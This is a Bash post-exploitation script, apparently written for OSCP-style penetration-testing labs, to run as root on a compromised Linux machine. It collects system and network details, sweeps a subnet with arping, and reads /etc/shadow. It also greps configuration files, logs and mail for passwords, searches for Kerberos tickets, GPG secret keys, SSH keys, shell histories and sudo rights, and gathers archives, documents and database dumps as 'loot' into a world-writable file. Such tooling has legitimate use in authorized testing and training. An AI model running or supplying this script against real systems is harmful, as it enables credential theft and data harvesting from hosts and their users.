#!/bin/bash
# post exploitation script for linux. Needs root or sudo
# OS-18010
# @tildasec
# https://github.com/crsftw/OSCP-cheat-sheet
# this script needs some love
# do modify the arping IPs
# Usage:
# 	chmod +x ./postex.sh && ./postex.sh 2>&1 | tee $PWD/post-exploitation.txt 

#creating the file and giving it permissions
touch $PWD/post-exploitation.txt
chmod 777 $PWD/post-exploitation.txt


# starting the work
printf \\n
echo -e " \e[96m*** SYS INFO ***\e[0m"
hostname
uname -a
cat /etc/*-release
cat /etc/fstab
df -h


printf \\n
echo -e " \e[96m*** PROOF files ***\e[0m"
printf \\n
find / -name network-secret.txt | xargs cat
find / -name proof.txt | xargs cat
find / -name flag.txt | xargs cat

printf \\n
echo -e " \e[96m*** NETWORKING ***\e[0m"
printf \\n
cat /etc/resolv.conf
cat /etc/motd
ifconfig
arp -a
route -n
cat /etc/network/interfaces
iptables -L -n -v
netstat -anop
find /etc -name *aliases* 2> /dev/null
find / -name *route* 2> /dev/null
find  / -name *arp* 2> /dev/null
printf \\n; echo -e "\e[96m***Starting arping. It will take a while...***\e[0m"
for ip in $(seq 0 254); do /usr/bin/arping -I eth0 -c 1 10.11.1.$ip;done | grep -i "unicast reply"

printf \\n
echo -e " \e[96m*** PASSWORDS ***\e[0m"
printf \\n
cat /etc/passwd
cat /etc/shadow
find / -name *master.passwd* 2> /dev/null
find / -name *passwd* 2> /dev/null | xargs ls -l
getent passwd

printf \\n
echo -e " \e[96m*** MAIL, KEYS, LOGS & stuff ***\e[0m"
printf \\n
grep -i passwd /var/mail/root
grep -i passwd /var/spool/mail/root
find / -name krb5cc_* 2> /dev/null
find / -name krb5.keytab 2> /dev/null
find / -name secring.gpgs 2> /dev/null
find / -name *.conf 2> /dev/null | xargs grep -i pass
find / -name *.log 2> /dev/null | xargs grep -i pass
find / -name *_log 2> /dev/null | xargs grep -i pass
find / -name *error.log 2> /dev/null | xargs grep -i pass
find / -name *error_log 2> /dev/null | xargs grep -i pass
find / -name *access.log  2> /dev/null | xargs grep -i pass
find / -name *access_log 2> /dev/null | xargs grep -i pass
find / -name *.xml 2> /dev/null | xargs grep -i password //needs more filtering
find / -name *.properties 2> /dev/null | xargs grep -i pass
find / -name passwords.dat  2> /dev/null | xargs grep -i pass
find / -name .htaccess 2> /dev/null | xargs grep -i pass
find / -name .htpasswd 2> /dev/null
find / -name *vnc* 2> /dev/null

printf \\n
echo -e " \e[96m*** LOOT ***\e[0m"
printf \\n
find / -name *.cap 2> /dev/null
find / -name *.pcap 2> /dev/null
find / -name *.rar 2> /dev/null
find / -name *.zip 2> /dev/null
find / -name *.gzip 2> /dev/null
find / -name *.tar 2> /dev/null
find / -name *.tar.gz 2> /dev/null
find / -name *.xls 2> /dev/null
find / -name *.doc 2> /dev/null
find / -name *.pdf 2> /dev/null
find / -name *.odt 2> /dev/null
find / -name *.pdb 2> /dev/null
find / -name *motd* 2> /dev/null
find / -name *.sql 2> /dev/null
find / -name *secret* 2> /dev/null

printf \\n
echo -e " \e[96m*** SSH ***\e[0m"
printf \\n
ls -alh /home/*/
ls -alh /home/*/.ssh/
find / -name *.ssh*
find / -name *authorized_keys*
find / -name known_hosts
find / -name *.hist*
find / -name *.subversion
find / -name *.git*
find / -name *sudoers*
find / -name *.viminfo
find / -name *.mysql_history

printf \\n
echo -e " \e[96m*** CRON & SUDO ***\e[0m"
printf \\n
sudo -l
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done

printf \\n
echo -e " \e[96m*** INSTALLED PACKAGES ***\e[0m"
printf \\n
rpm -qa
dpkg -l
cd /var/db/pkg/ && ls -d 
pacman -Q

printf \\n
echo -e " \e[96m*** CONFIG file and ARCHIVES ***\e[0m"
printf \\n
locate tar | grep [.]tar$ # Remember to updatedb before running locate
locate tgz | grep [.]tgz$
locate sql | grep [.]sql$
locate settings | grep [.]php$
locate config.inc | grep [.]php$
locate *config* | grep [.]php$

printf \\n\\n
echo -e " \e[96m=========== DONE! ===========\e[0m"
printf \\n\\n
